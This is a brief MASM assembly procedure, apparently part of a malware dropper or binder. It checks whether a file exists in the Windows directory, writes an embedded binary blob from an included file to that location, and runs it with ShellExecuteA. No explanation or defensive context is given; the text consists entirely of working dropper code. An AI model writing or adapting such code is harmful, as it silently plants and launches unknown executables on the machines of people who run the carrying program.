  include file.inc
.data?
szAttachFmt  dd ?
.code
AttachLayer proc
  LOCAL   hFile: DWORD 
  LOCAL   bWritten: DWORD  
  invoke  GetWindowsDirectory, offset lpBuf1, MAX_PATH+1 
  invoke  lstrcat, offset lpBuf1, offset szfilename  
  invoke exist, addr lpBuf1  
  cmp eax,0 
  jz dwg  
  jnz go_exit 
  dwg:  
  invoke  CreateFile, offset lpBuf1, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
  mov     hFile, eax
  invoke  WriteFile, hFile, offset file, fileLen, addr bWritten, NULL
  invoke  CloseHandle, hFile
  invoke  ShellExecuteA,0,offset szTextOpen,offset lpBuf1, NULL,NULL,1
  go_exit:  
  ret 
 AttachLayer endp  
